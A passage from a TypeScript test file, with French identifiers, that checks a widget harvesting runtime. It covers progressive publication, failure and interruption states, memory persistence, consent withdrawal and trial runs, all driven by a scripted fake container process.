    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "sortie" }],
  });
  async function enVeille(ctx: Contexte, o: { auFilDeLEau?: boolean; dureeMaxMinutes?: number } = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(veille(o)));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), "export default () => [];");
    if (o.dureeMaxMinutes !== undefined) ctx.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: o.dureeMaxMinutes };
  }

  /**
   * Un faux conteneur qui écrit ses lignes une à une ; une fonction (éventuellement asynchrone) est appelée à la place
   * d'une ligne. `recu` : ce que le noyau lui écrit ; `bloque` : il ne sort jamais de lui-même (seulement tué).
   */
  const lanceurPas = (ctx: Contexte, pas: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): LanceurProcessus => (cmd, args) => {
    ctx.commandes.push([cmd, ...args]);
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let tuer = () => {};
    const fin = new Promise<number | null>((ok) => {
      tuer = () => ok(null);
      void (async () => {
        for (const p of pas) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") await p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })().catch(() => {
        // Une sonde a échoué : le conteneur s'arrête tout de suite (le test échoue sur ce que la sonde n'a pas vu).
        stdout.end();
        stderr.end();
        ok(1);
      });
    });
    return { stdin, stdout, stderr, tuer: () => tuer(), fin };
  };

  /** Une horloge que les pas font avancer. */
  const horlogeMobile = () => {
    let t = MAINTENANT.getTime();
    return { horloge: () => new Date(t), avancer: (ms: number) => () => void (t += ms) };
  };
  const debutBloc = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const finBloc = (id: string, sortie: unknown) => ({ t: "bloc", id, etape: "fin", statut: "reussi", sortie });
  const pub = (donnees: unknown, faits: number, total: number) => ({ t: "publication", donnees, faits, total });
  const mem = (valeur: unknown) => ({ t: "memoire", memoire: { liste: { type: "code", valeur } } });
  const A1 = { url: "https://a.example/1" };
  const A2 = { url: "https://a.example/2" };
  const A3 = { url: "https://a.example/3" };
  /** Le début d'une exécution de veille() jusqu'à l'ouverture de la chaîne (fiche). */
  const avantChaine = (liste: unknown[]) => [debutBloc("liste"), finBloc("liste", liste), debutBloc("fiche")];
  /** Attend que `f` soit vrai (les relais s'écrivent en tâche de fond). */
  async function attendre(f: () => Promise<boolean>): Promise<void> {
    for (let i = 0; i < 200; i++) {
      if (await f()) return;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("attente trop longue");
  }
  const progressionVaut = (ctx: Contexte, faits: number) => async () =>
    (await lireEtatWidget(ctx.dossierWidgets, ctx.widget.id)).progression?.faits === faits;
  const DERNIERE_MAJ = "2026-10-27T08:00:00.000Z";
  async function etatAvant(ctx: Contexte) {
    await ecrireEtatWidget(ctx.dossierWidgets, ctx.widget.id, { statut: "ok", derniereMaj: DERNIERE_MAJ, derniereTentative: DERNIERE_MAJ });
  }

  it("deux publications écrivent données et état en-cours avec progression ; la fin écrit le résultat final et retire la progression", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true });
    await etatAvant(ctx);
    const { horloge: h, avancer } = horlogeMobile();
    const vus: unknown[] = [];
    const sonde = (faits: number) => async () => {
      await attendre(progressionVaut(ctx, faits));
      vus.push({ etat: await lireEtatWidget(ctx.dossierWidgets, "veille"), donnees: await lireJson(fichierDonnees(ctx)) });
    };
    let changes = 0;
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      surChange: () => void changes++,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2]),
        mem(["1"]),
        pub([A1], 1, 2),
        sonde(1),
        avancer(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 2),
        sonde(2),
        finBloc("fiche", [A1, A2]),
        debutBloc("sortie"),
        finBloc("sortie", [A1, A2]),
        { t: "fin", donnees: { final: [A1, A2] } },
      ]),
    });
    expect(vus).toEqual([
      {
        etat: { statut: "en-cours", derniereMaj: DERNIERE_MAJ, derniereTentative: MAINTENANT.toISOString(), progression: { faits: 1, total: 2 } },
        donnees: [A1],
      },
      {
        etat: { statut: "en-cours", derniereMaj: DERNIERE_MAJ, derniereTentative: MAINTENANT.toISOString(), progression: { faits: 2, total: 2 } },
        donnees: [A1, A2],
      },
    ]);
    // Début, deux publications, fin.
    expect(changes).toBe(4);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ final: [A1, A2] });
    expect(await lireJson(fichierDonnees(ctx))).toEqual({ final: [A1, A2] });
    const etat = await lireEtatWidget(ctx.dossierWidgets, "veille");
    expect(etat.statut).toBe("ok");
    expect(etat.progression).toBeUndefined();
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1", "2"]);
  });

  it("échec après deux publications : la dernière reste, état erreur, mémoire de l'exécution gardée", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    await etatAvant(ctx);
    await ecrireDonnees(ctx.dossierWidgets, "veille", { ancien: true });
    await ecrireMemoire(donneesDe(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const { horloge: h, avancer } = horlogeMobile();
    const recu: string[] = [];
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(
        ctx,
        [...avantChaine([A1, A2, A3]), mem(["1"]), pub([A1], 1, 3), avancer(5000), mem(["1", "2"]), pub([A1, A2], 2, 3), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }],
        { recu },
      ),
    });
    // La durée maximale est passée : limite envoyée, exécution progressive, conteneur arrêté à 30 min + 30 s.
    expect(JSON.parse(recu.join("").split("\n")[0]!)).toMatchObject({ limiteMs: 1_800_000, progressif: true });
    expect(ctx.commandes[0]!.slice(ctx.commandes[0]!.indexOf("timeout"), ctx.commandes[0]!.indexOf("timeout") + 4)).toEqual(["timeout", "-k", "5", "1830"]);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "cassé", derniereMaj: DERNIERE_MAJ });
    expect(r.etat.progression).toBeUndefined();
    expect(await lireJson(fichierDonnees(ctx))).toEqual([A1, A2]);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "veille");
    expect(etat).toMatchObject({ statut: "erreur", derniereMaj: DERNIERE_MAJ });
    expect(etat.progression).toBeUndefined();
    // La dernière mémoire sûre (pas seulement celle relayée en cours de route, la première).
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1", "2"]);
    expect((await lireExecution(donneesDe(ctx), r.execution!))?.statut).toBe("echouee");
  });

  it("interrompue après une publication : données publiées et mémoire gardées, exécution interrompue", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true });
    const { horloge: h, avancer } = horlogeMobile();
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      delaiMs: 500,
      interrompue: () => true,
      lancer: lanceurPas(ctx, [...avantChaine([A1, A2]), mem(["0"]), pub([], 0, 2), avancer(5000), mem(["1"]), pub([A1], 1, 2), { t: "journal", bloc: "fiche", texte: "x" }], { bloque: true }),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await lireJson(fichierDonnees(ctx))).toEqual([A1]);
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1"]);
    expect((await lireExecution(donneesDe(ctx), r.execution!))?.statut).toBe("interrompue");
  });

  it("widget sans les nouveaux champs en échec : mémoire non écrite (comme avant)", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx);
    await ecrireMemoire(donneesDe(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const avant = await readFile(fichierMemoire(ctx), "utf8");
    const r = await executerRecolte({
      ...optionsDe(ctx),
      lancer: lanceurPas(ctx, [debutBloc("liste"), mem(["1"]), finBloc("liste", [A1]), debutBloc("fiche"), { t: "echec", erreur: "cassé" }]),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await readFile(fichierMemoire(ctx), "utf8")).toBe(avant);
  });

  it("widget avec compte et auFilDeLEau : accord retiré entre deux publications → données effacées, accord-requis, plus rien d'écrit", async () => {
    const ctx = await preparer("veille", "", { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] });
    await enVeille(ctx, { auFilDeLEau: true });
    await accorder(ctx.dossierWidgets, "veille", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const { horloge: h, avancer } = horlogeMobile();
    const vus: unknown[] = [];
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        async () => {
          await attendre(progressionVaut(ctx, 1));
          // Ce que fait refuserAccord, sans l'effacement : seul le retrait est vu par l'exécution.
          await retirerAccord(ctx.dossierWidgets, "veille");
        },
        avancer(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 3),
        avancer(5000),
        mem(["1", "2", "3"]),
        pub([A1, A2, A3], 3, 3),
        async () => {
          await new Promise((t) => setTimeout(t, 150));
          vus.push({
            donnees: existsSync(fichierDonnees(ctx)),
            memoire: existsSync(fichierMemoire(ctx)),
            progression: (await lireEtatWidget(ctx.dossierWidgets, "veille")).progression,
          });
        },
        finBloc("fiche", [A1, A2, A3]),
        debutBloc("sortie"),
        finBloc("sortie", [A1, A2, A3]),
        { t: "fin", donnees: [A1, A2, A3] },
      ]),
    });
    // Après le retrait, ni données ni mémoire, et l'état ne montre plus aucune publication.
    expect(vus).toEqual([{ donnees: false, memoire: false, progression: { faits: 1, total: 3 } }]);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(fichierDonnees(ctx))).toBe(false);
    expect(existsSync(fichierMemoire(ctx))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect((await lireEtatWidget(ctx.dossierWidgets, "veille")).statut).toBe("accord-requis");
  });

  it("un essai d'un widget auFilDeLEau n'écrit ni données ni état (ni mémoire), même avec dureeMaxMinutes ; limiteMs envoyé, jamais progressif", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    const { horloge: h, avancer } = horlogeMobile();
    const reel = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [...avantChaine([A1]), mem(["1"]), pub([A1], 1, 1), finBloc("fiche", [A1]), debutBloc("sortie"), finBloc("sortie", [A1]), { t: "fin", donnees: [A1] }]),
    });
    expect(reel.etat.statut).toBe("ok");
    const instantane = async () => {
      const r: Record<string, { texte: string; mtime: number } | null> = {};
      for (const nom of ["donnees.json", "memoire.json", "etat.json"]) {
        const chemin = join(donneesDe(ctx), nom);
        r[nom] = existsSync(chemin) ? { texte: await readFile(chemin, "utf8"), mtime: (await stat(chemin)).mtimeMs } : null;
      }
      return r;
    };
    const avant = await instantane();
    expect(Object.values(avant).every((f) => f !== null)).toBe(true);
    const recu: string[] = [];
    avancer(60_000)();
    const r = await executerEssai({
      ...optionsDe(ctx),
      horloge: h,
      origine: reel.execution!,
      depart: "fiche",
      lancer: lanceurPas(
        ctx,
        [debutBloc("fiche"), mem(["2"]), pub([A2], 1, 1), avancer(5000), mem(["3"]), pub([A3], 1, 1), finBloc("fiche", [A2]), debutBloc("sortie"), finBloc("sortie", [A2]), { t: "fin", donnees: [A2] }],
        { recu },
      ),
    });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut.limiteMs).toBe(1_800_000);
    expect(debut.progressif).toBeUndefined();
    expect(await instantane()).toEqual(avant);
  });

  it("web : la recherche part de urlRecherche, par le ménagement donné", async () => {
    const BASE = "https://ddg.test/html/";
    const html = `<div class="result"><a class="result__a" href="https://a.example/1">Titre</a><a class="result__snippet">Extrait</a></div>`;
    const ctx = await preparer("veille", `export default async (w) => w.chercherWeb("clio", { nombre: 1 });`);
    ctx.widget.declaration.sources.web = true;
    const menagement = new Menagement({ attendre: async () => {} });
    const rechercher = vi.spyOn(menagement, "rechercher");
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], html: { [urlRecherche("clio", BASE)]: html } } });
    const r = await executerRecolte({ ...optionsDe(ctx), pont, menagement, urlRecherche: BASE });
    expect(r.donnees).toEqual([{ titre: "Titre", url: "https://a.example/1", extrait: "Extrait" }]);
    expect(rechercher).toHaveBeenCalledTimes(1);
  });

  it("nouveaux : 3 annonces dont 1 déjà dans les données précédentes → 2 ; widget sans notifier → absent", async () => {
    const code = `export default async () => [{ url: "https://a.example/1", prix: 12 }, { url: "https://a.example/2" }, { url: "https://a.example/3" }];`;
    const ctx = await preparer("annonces", code);
    ctx.widget.declaration.recolte = { minutes: 60, notifier: true };
    await ecrireDonnees(ctx.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r = await executerRecolte(optionsDe(ctx));
    expect(r.etat.statut).toBe("ok");
    expect(r.nouveaux).toBe(2);

    const sans = await preparer("annonces", code);
    await ecrireDonnees(sans.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r2 = await executerRecolte(optionsDe(sans));
    expect(r2.etat.statut).toBe("ok");
    expect(r2).not.toHaveProperty("nouveaux");
  });
});
